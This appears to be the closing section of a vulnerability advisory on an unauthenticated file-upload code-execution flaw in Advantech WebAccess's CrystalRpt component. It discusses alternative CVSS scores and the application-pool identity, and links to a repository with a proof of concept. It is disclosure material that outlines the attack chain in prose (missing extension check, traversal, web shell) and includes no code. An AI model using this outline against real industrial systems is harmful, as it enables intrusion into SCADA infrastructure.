**Conditional reading — deployment with IIS authentication enforced on the `WaCrpt` application.**

`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` — **8.8 High**

If an administrator has disabled anonymous authentication on the `WaCrpt` application path, or has fronted it with a gateway requiring a session, an unauthenticated caller receives a 401 challenge instead of the upload form and the chain requires an authenticated principal. Nothing else in the finding changes: the extension check is still absent, the traversal still lands on the application root, and the write still executes. `PR` moves from N to L and the base score falls to 8.8. This reading is published as **conditional and configuration-dependent**, not as an alternative primary, because — as section 3 states — the record contains no extracted installer artifact proving anonymous authentication is enabled for `WaCrpt` specifically, and the structural argument that it must be (the product's own login page) is the basis on which PR:N is published as primary.

**Rejected reading — AC:H.**

`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` — **8.1 High**

Considered and rejected. An AC:H argument would rest on the traversal depth being non-obvious (three levels fail) or the `User-Agent` requirement being a hidden tripwire. Neither qualifies: CVSS 3.1 reserves AC:H for conditions *beyond the attacker's control*, and both of these are fixed constants discovered once and satisfied deterministically forever after. Publishing 8.1 would understate the finding; it is recorded here only to show the alternative was priced rather than ignored.

**Identity caveat and its effect on the score.** Section 10 establishes that the verified `nt authority\system` identity belongs to the verification pool, and that the shipped default pool identity was not determined from an artifact. The primary vector is unaffected: C:H/I:H/A:H are assessed on the code-execution primitive — a shell inside the product's own web tier with write access to served application content and access to the product's data and backends — which holds under `ApplicationPoolIdentity` as well as under LocalSystem. Where the pool is SYSTEM, the impact statements are at their strongest; where it is not, they remain High and the residual privilege distance becomes a local problem. No lower score is published on identity grounds, and none would be defensible: a constrained pool identity still owns the SCADA web interface and everything it serves.

### Reference

- Advisory: https://0day-rubbish.com/blog/advantech-webaccess-crystalrpt-unauth-file-upload-rce
- Repository and shipped PoC: https://github.com/Exploit-Garbage/0day-Rubbish
- Contact: disclosure@0day-rubbish.com

---

Advisory: https://0day-rubbish.com/blog/advantech-webaccess-crystalrpt-unauth-file-upload-rce
Repository: https://github.com/Exploit-Garbage/0day-Rubbish
Contact: disclosure@0day-rubbish.com
